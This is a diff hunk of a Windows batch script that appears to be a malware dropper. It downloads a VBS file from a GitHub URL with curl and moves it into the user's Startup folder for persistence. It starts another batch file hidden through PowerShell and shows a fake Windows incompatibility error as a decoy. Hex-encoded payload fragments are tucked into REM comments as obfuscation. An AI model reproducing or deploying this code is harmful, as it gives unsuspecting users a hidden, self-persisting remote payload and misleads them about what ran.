@@ -122,7 +122,7 @@ curl https://raw.githubusercontent.com/0x2034/shell5/main/start.vbs -o %temp%\st
 @REM 2e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f202020202020202020202020202020206966206e6f74206f75747075745e5e5e5e3a205
 @REM e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2020202020202020202020202020202020202020627265616b205e
 @REM 3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020
-move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 powershell -c "Start-Process -FilePath "%temp%\pro.bat" -WindowStyle Hidden"
 echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
 @REM 73746172742e626174202d2d3e20696e206361736520726567656e65726174696e67206e696862746474646f772e6261740a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d
